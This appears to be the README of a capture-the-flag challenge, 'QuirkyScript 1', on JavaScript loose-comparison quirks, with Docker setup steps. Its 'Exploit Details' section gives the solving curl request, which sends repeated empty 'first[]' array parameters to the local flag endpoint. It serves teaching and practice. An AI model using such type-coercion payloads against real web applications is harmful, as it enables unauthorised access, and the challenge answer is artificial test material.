QuirkyScript 1
---------

Javascript weird compares.

# Question Text

```
Get the flag.

http://ctf.pwn.sg:8081
```

*Creator -  quanyang (@quanyang)*

# Setup Guide

0. Install docker on the hosting system
1. Replace the flag in distribute/flag
2. Build the docker image with: `sh dockerbuild.sh`
3. Replace the port 8081 with your desired port in dockerrun.sh
4. Start the docker image: `sh dockerrun.sh`
5. Test the connectivity with netcat.

# Exploit Details

```
curl -g 'localhost:8081/flag?first[]=&first[]=&first[]=&first[]=&first[]=&first[]=&first[]=&first[]='
```
